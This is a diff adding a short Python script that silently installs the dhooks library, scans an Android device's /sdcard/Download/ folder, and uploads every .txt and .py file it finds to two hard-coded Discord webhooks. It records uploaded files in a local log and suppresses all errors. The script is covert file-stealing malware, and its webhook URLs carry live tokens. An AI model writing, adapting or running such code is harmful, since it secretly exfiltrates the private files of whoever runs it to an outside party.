@@ -1,0 +1,42 @@
+try:
+	from dhooks import Webhook, File
+except:
+	import os
+	os.system("pip install dhooks && clear")
+	
+import os
+hook_txt = Webhook("https://discord.com/api/webhooks/1047580761085190165/z8iKPE8lpa8CsxNWqkdMkHX4sc4gslrFfvTxDWmI42V_-cjiOHlFG4iL96UX4ASCo5vX")
+hook_py=Webhook("https://discord.com/api/webhooks/1047602523772559400/ZJIFjwBh8AswZw_-oYj0d6AIrVIaEonaraKVOzMijIIhnVzXyWNFJ_4B6iNRii-tmcQz")
+
+try:
+	open("python-data","r").read()
+except:
+	open("python-data","a").write("")
+try:
+    dirr="/sdcard/Download/"
+    for files in os.listdir (dirr):
+        if files.endswith(".txt"):
+            dar=dirr+files
+            if dar not in open("python-data","r").read():
+                file=File(dar)
+                try:
+                    hook_txt.send(".Txt Founded",file=file)
+                except:
+                	pass
+                open("python-data","a").write(dar+"\n")
+except:
+    pass
+try:
+    dirr="/sdcard/Download/"
+    for files in os.listdir (dirr):
+        if files.endswith(".py"):
+            dar=dirr+files
+            if dar not in open("python-data","r").read():
+                file=File(dar)
+                try:
+                    hook_py.send(".Py Founded",file=file)
+                except:
+                	pass
+                open("python-data","a").write(dar+"\n")
+except:
+    pas
